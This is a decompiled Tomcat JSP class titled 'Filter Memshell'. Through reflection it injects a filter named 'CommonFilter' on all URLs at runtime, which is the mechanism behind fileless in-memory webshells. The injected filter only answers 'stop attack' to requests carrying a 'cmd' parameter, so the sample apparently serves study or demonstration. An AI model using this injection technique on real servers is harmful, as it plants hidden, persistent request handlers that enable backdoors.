        /*
         * Decompiled with CFR.
         */
        package org.apache.jsp;
        
        import java.io.IOException;
        import java.io.InputStream;
        import java.lang.reflect.Constructor;
        import java.lang.reflect.Field;
        import java.util.HashSet;
        import java.util.Map;
        import java.util.Scanner;
        import java.util.Set;
        import javax.el.ExpressionFactory;
        import javax.servlet.DispatcherType;
        import javax.servlet.Filter;
        import javax.servlet.FilterChain;
        import javax.servlet.ServletContext;
        import javax.servlet.ServletException;
        import javax.servlet.ServletRequest;
        import javax.servlet.ServletResponse;
        import javax.servlet.http.HttpServletRequest;
        import javax.servlet.http.HttpServletResponse;
        import javax.servlet.jsp.JspFactory;
        import javax.servlet.jsp.JspWriter;
        import javax.servlet.jsp.PageContext;
        import javax.servlet.jsp.SkipPageException;
        import org.apache.catalina.Context;
        import org.apache.catalina.core.ApplicationContext;
        import org.apache.catalina.core.ApplicationFilterConfig;
        import org.apache.catalina.core.StandardContext;
        import org.apache.jasper.runtime.HttpJspBase;
        import org.apache.jasper.runtime.InstanceManagerFactory;
        import org.apache.jasper.runtime.JspSourceDependent;
        import org.apache.jasper.runtime.JspSourceImports;
        import org.apache.tomcat.InstanceManager;
        import org.apache.tomcat.util.descriptor.web.FilterDef;
        import org.apache.tomcat.util.descriptor.web.FilterMap;
        
        public final class Filter_005fShell_jsp
        extends HttpJspBase
        implements JspSourceDependent,
        JspSourceImports {
            private static final JspFactory _jspxFactory = JspFactory.getDefaultFactory();
            private static Map<String, Long> _jspx_dependants;
            private static final Set<String> _jspx_imports_packages;
            private static final Set<String> _jspx_imports_classes;
            private volatile ExpressionFactory _el_expressionfactory;
            private volatile InstanceManager _jsp_instancemanager;
        
            static {
                _jspx_imports_packages = new HashSet<String>();
/* 76*/         _jspx_imports_packages.add("javax.servlet");
/* 77*/         _jspx_imports_packages.add("javax.servlet.http");
/* 78*/         _jspx_imports_packages.add("javax.servlet.jsp");
                _jspx_imports_classes = new HashSet<String>();
/* 80*/         _jspx_imports_classes.add("org.apache.tomcat.util.descriptor.web.FilterDef");
/* 81*/         _jspx_imports_classes.add("java.util.Map");
/* 82*/         _jspx_imports_classes.add("java.util.Scanner");
/* 83*/         _jspx_imports_classes.add("java.io.IOException");
/* 84*/         _jspx_imports_classes.add("org.apache.catalina.core.ApplicationContext");
/* 85*/         _jspx_imports_classes.add("org.apache.tomcat.util.descriptor.web.FilterMap");
/* 86*/         _jspx_imports_classes.add("org.apache.catalina.Context");
/* 87*/         _jspx_imports_classes.add("org.apache.catalina.core.StandardContext");
/* 88*/         _jspx_imports_classes.add("org.apache.catalina.core.ApplicationFilterConfig");
/* 89*/         _jspx_imports_classes.add("java.lang.reflect.Field");
/* 90*/         _jspx_imports_classes.add("java.lang.reflect.Constructor");
/* 91*/         _jspx_imports_classes.add("java.io.InputStream");
            }
        
            @Override
            public void _jspService(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
                block16: {
/*140*/             if (!DispatcherType.ERROR.equals((Object)request.getDispatcherType())) {
                        String _jspx_method = request.getMethod();
/*142*/                 if ("OPTIONS".equals(_jspx_method)) {
/*143*/                     response.setHeader("Allow", "GET, HEAD, POST, OPTIONS");
/*144*/                     return;
                        }
/*146*/                 if (!("GET".equals(_jspx_method) || "POST".equals(_jspx_method) || "HEAD".equals(_jspx_method))) {
/*147*/                     response.setHeader("Allow", "GET, HEAD, POST, OPTIONS");
/*148*/                     response.sendError(405, "JSPs only permit GET, POST or HEAD. Jasper also permits OPTIONS");
/*149*/                     return;
                        }
                    }
/*157*/             JspWriter out = null;
/*159*/             JspWriter _jspx_out = null;
/*160*/             PageContext _jspx_page_context = null;
                    try {
                        try {
                            PageContext pageContext;
/*164*/                     response.setContentType("text/html;charset=UTF-8");
                            _jspx_page_context = pageContext = _jspxFactory.getPageContext(this, request, response, null, true, 8192, true);
/*168*/                     pageContext.getServletContext();
/*169*/                     pageContext.getServletConfig();
/*170*/                     pageContext.getSession();
                            _jspx_out = out = pageContext.getOut();
/*174*/                     out.write("\r\n");
/*175*/                     out.write("\r\n");
/*176*/                     out.write("\r\n");
/*177*/                     out.write("\r\n");
/*178*/                     out.write("\r\n");
/*179*/                     out.write("\r\n");
/*180*/                     out.write("\r\n");
/*181*/                     out.write("\r\n");
/*182*/                     out.write("\r\n");
/*183*/                     out.write("\r\n");
/*184*/                     out.write("\r\n");
/*185*/                     out.write("\r\n");
/*186*/                     out.write("\r\n");
/*187*/                     out.write("\r\n");
/*188*/                     out.write("\r\n");
/*189*/                     out.write("\r\n");
/*190*/                     out.write("\r\n");
/*192*/                     ServletContext servletContext = request.getSession().getServletContext();
/*193*/                     Field appContextField = servletContext.getClass().getDeclaredField("context");
/*194*/                     appContextField.setAccessible(true);
/*195*/                     ApplicationContext applicationContext = (ApplicationContext)appContextField.get(servletContext);
/*196*/                     Field standardContextField = applicationContext.getClass().getDeclaredField("context");
/*197*/                     standardContextField.setAccessible(true);
/*198*/                     StandardContext standardContext = (StandardContext)standardContextField.get(applicationContext);
/*207*/                     out.write("\r\n");
/*208*/                     out.write("\r\n");
/*209*/                     out.write("\r\n");
/*210*/                     out.write("\r\n");
                            Shell_Filter filter = new Shell_Filter();
/*213*/                     String name = "CommonFilter";
                            FilterDef filterDef = new FilterDef();
/*216*/                     filterDef.setFilter(filter);
/*217*/                     filterDef.setFilterName(name);
/*218*/                     filterDef.setFilterClass(filter.getClass().getName());
/*219*/                     standardContext.addFilterDef(filterDef);
                            FilterMap filterMap = new FilterMap();
/*222*/                     filterMap.addURLPattern("/*");
/*223*/                     filterMap.setFilterName(name);
/*224*/                     filterMap.setDispatcher(DispatcherType.REQUEST.name());
/*225*/                     standardContext.addFilterMapBefore(filterMap);
/*234*/                     Field Configs = standardContext.getClass().getSuperclass().getDeclaredField("filterConfigs");
/*239*/                     Configs.setAccessible(true);
/*240*/                     Map filterConfigs = (Map)Configs.get(standardContext);
/*242*/                     Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
/*243*/                     constructor.setAccessible(true);
/*244*/                     ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)constructor.newInstance(standardContext, filterDef);
/*246*/                     filterConfigs.put(name, filterConfig);
/*248*/                     out.write("\r\n");
/*249*/                     out.write("\r\n");
/*250*/                     out.write("\r\n");
/*251*/                     out.write("\r\n");
/*252*/                     out.write("\r\n");
/*253*/                     out.write("<html>\r\n");
/*254*/                     out.write("<head>\r\n");
/*255*/                     out.write("    <title>Filter Memshell</title>\r\n");
/*256*/                     out.write("</head>\r\n");
/*257*/                     out.write("<body>\r\n");
/*258*/                     out.write("    <br>普通jsp直接页面返回！！<br>\r\n");
/*259*/                     out.write("</body>\r\n");
/*260*/                     out.write("</html>\r\n");
                        }
                        catch (Throwable t) {
/*262*/                     if (!(t instanceof SkipPageException)) {
/*263*/                         out = _jspx_out;
                                if (out != null && out.getBufferSize() != 0) {
                                    try {
/*266*/                                 if (response.isCommitted()) {
/*267*/                                     out.flush();
                                        } else {
/*269*/                                     out.clearBuffer();
                                        }
                                    }
                                    catch (IOException iOException) {}
                                }
/*272*/                         if (_jspx_page_context != null) {
                                    _jspx_page_context.handlePageException(t);
                                } else {
                                    throw new ServletException(t);
                                }
                            }
/*276*/                     _jspxFactory.releasePageContext(_jspx_page_context);
                            break block16;
                        }
                    }
                    catch (Throwable throwable) {
/*276*/                 _jspxFactory.releasePageContext(_jspx_page_context);
/*277*/                 throw throwable;
                    }
/*276*/             _jspxFactory.releasePageContext(_jspx_page_context);
                }
            }
        
            @Override
            public Map<String, Long> getDependants() {
/* 98*/         return _jspx_dependants;
            }
        
            /*
             * WARNING - Removed try catching itself - possible behaviour change.
             */
            public InstanceManager _jsp_getInstanceManager() {
/*121*/         if (this._jsp_instancemanager == null) {
/*122*/             Filter_005fShell_jsp filter_005fShell_jsp = this;
                    synchronized (filter_005fShell_jsp) {
/*123*/                 if (this._jsp_instancemanager == null) {
/*124*/                     this._jsp_instancemanager = InstanceManagerFactory.getInstanceManager(this.getServletConfig());
                        }
                    }
                }
/*128*/         return this._jsp_instancemanager;
            }
        
            @Override
            public Set<String> getPackageImports() {
/*102*/         return _jspx_imports_packages;
            }
        
            /*
             * WARNING - Removed try catching itself - possible behaviour change.
             */
            public ExpressionFactory _jsp_getExpressionFactory() {
/*110*/         if (this._el_expressionfactory == null) {
/*111*/             Filter_005fShell_jsp filter_005fShell_jsp = this;
                    synchronized (filter_005fShell_jsp) {
/*112*/                 if (this._el_expressionfactory == null) {
/*113*/                     this._el_expressionfactory = _jspxFactory.getJspApplicationContext(this.getServletConfig().getServletContext()).getExpressionFactory();
                        }
                    }
                }
/*117*/         return this._el_expressionfactory;
            }
        
            @Override
            public Set<String> getClassImports() {
/*106*/         return _jspx_imports_classes;
            }
        
            @Override
            public void _jspDestroy() {
            }
        
            @Override
            public void _jspInit() {
            }
        
            public class Shell_Filter
            implements Filter {
                @Override
                public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
                    HttpServletRequest req = (HttpServletRequest)request;
                    if (req.getParameter("cmd") != null) {
                        String output = "stop attack！！！！";
                        response.getWriter().write(output);
                        response.getWriter().flush();
                        return;
                    }
                    chain.doFilter(request, response);
                }
            }
        }

